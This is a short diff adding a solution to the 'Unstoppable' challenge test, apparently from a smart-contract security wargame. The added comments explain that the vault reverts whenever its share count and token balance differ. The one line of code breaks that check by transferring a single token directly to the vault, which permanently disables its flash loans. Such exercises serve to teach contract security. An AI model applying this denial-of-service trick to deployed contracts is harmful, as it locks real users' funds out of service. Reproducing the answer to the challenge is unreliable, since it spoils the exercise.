@@ -45,6 +45,12 @@ describe('[Challenge] Unstoppable', function () {
 
     it('Execution', async function () {
         /** CODE YOUR SOLUTION HERE */
+        // The line 96 of the UnstoppableVault contract it's the key
+        // if (convertToShares(totalSupply) != balanceBefore) revert InvalidBalance();
+        // If we beak the equality between totalSupply and balanceBefore sending 1 extra token to the vault
+        // We're going to make the contract to be reverted every time it's called.
+        await token.transfer(vault.address, 1);
+
     });
 
     after(async function () {
